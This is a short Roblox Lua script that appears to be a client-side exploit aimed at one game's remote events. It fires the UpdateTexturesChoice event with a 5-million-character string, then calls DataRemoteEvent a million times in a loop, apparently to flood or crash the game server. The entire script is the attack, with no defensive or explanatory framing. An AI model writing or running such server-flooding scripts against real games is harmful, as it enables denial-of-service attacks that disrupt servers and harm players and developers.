local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Event1 = ReplicatedStorage.DataEvents.UpdateTexturesChoice
local Event2 = ReplicatedStorage.DataEvents.DataRemoteEvent

Event1:FireServer(("A"):rep(5e6))
for _ = 1, 1e6 do
    Event2:FireServer()
end
